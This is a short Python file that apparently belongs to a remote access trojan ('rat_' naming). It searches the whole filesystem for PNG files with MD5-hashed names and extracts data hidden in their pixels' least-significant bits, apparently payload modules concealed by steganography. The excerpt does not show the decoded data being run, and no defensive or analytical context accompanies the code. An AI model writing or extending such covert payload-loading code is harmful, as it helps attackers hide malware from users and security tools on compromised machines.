from turtle import width
from PIL import Image
import numpy as np
import os
import hashlib
import sys

def get_image_path(module):
    filename = hashlib.md5(f"rat_{module}".encode('utf-8')).hexdigest()
    filename += ".png"

    base_path = "C:" if "win" in sys.platform else "/"

    for root, _, files in os.walk(base_path):
        if filename in files:
            return os.path.join(root, filename)

def extract_lsb_data_from_image(image_path):
    with Image.open(image_path) as img:
        width, height = img.size
        img_data = np.array(img)

    img_data = np.reshape(img_data, width*height*3)
    img_data = img_data & 1
    img_data = np.packbits(img_data)

    img_data_chr = ''.join([chr(x) for x in img_data])
    data = img_data_chr.split("#end", 1)[0]
    return data